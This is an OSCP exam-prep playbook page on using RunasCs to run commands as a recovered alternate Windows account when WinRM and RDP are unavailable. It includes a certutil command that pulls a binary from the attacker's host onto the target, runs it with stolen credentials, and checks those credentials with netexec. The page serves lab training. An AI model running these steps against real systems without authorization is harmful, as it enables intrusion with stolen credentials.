# Windows - RunasCs

**Step 28B of 50 · Windows**

*Run one command as a recovered alternate user when WinRM and RDP are unavailable.*

## When to use this page

Use this page when you have a valid username and password but no remote interactive service accepts them. RunasCs creates a process with the alternate user’s logon token; it is useful for testing access to a local web shell, share, or privilege-sensitive command.

## Transfer RunasCs

> **Why:** This command serves the reviewed RunasCs binary from Kali so the target can download it without needing an existing file share.
```bash
transfer $BoxDir/tools/RunasCs.exe
```

> **Why:** This target-side command downloads the binary into a temporary location; look for a completed transfer before executing it.
```powershell
certutil -urlcache -f http://$LocalIP/RunasCs.exe C:\Windows\Temp\RunasCs.exe
```

## Run as the alternate account

> **Why:** RunasCs starts `cmd.exe` under the supplied credential; `whoami` confirms which account actually received the new token.
```powershell
C:\Windows\Temp\RunasCs.exe $Username2 $Password2 "cmd /c whoami && hostname"
```

## Example output

```text
$Domain\\$Username2
HOSTNAME
```

## What did you get?

- [ ] The process runs as `$Username2` → **Run `whoami` inside the process, use that process to connect to the discovered service, and go to Step 27 · [[Windows - Shell Received]] when a shell is obtained**
- [ ] Authentication fails → **Run `netexec smb $BoxIP -u $Username2 -p $Password2`, recheck the domain and account format, then return to Step 32 · [[Windows - Credential Search]]**
- [ ] The binary is blocked or crashes → **Run `systeminfo` and `certutil -hashfile RunasCs.exe SHA256`, compare the architecture and file hash, then return to Step 28 · [[Windows - Privilege Triage]]**
- [ ] No useful command can run as the alternate account → **Run `netstat -ano`, inspect the discovered service and ACL paths, then return to Step 28 · [[Windows - Privilege Triage]]**

## Notes

RunasCs is a credentialed process launcher, not a privilege-escalation exploit by itself. The new account’s group membership and local permissions still determine what the process can do.

## Gotcha

> [!warning] 💡
> Do not place recovered passwords in screenshots or shared transcripts. Delete the transferred binary during Step 33 · [[Windows - Clean Down]].

## Additional routing

- [ ] The alternate process runs and reaches the service → **Continue to Step 27 · [[Windows - Shell Received]]**
- [ ] Authentication or execution fails → **Return to Step 32 · [[Windows - Credential Search]] or Step 28 · [[Windows - Privilege Triage]]**
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
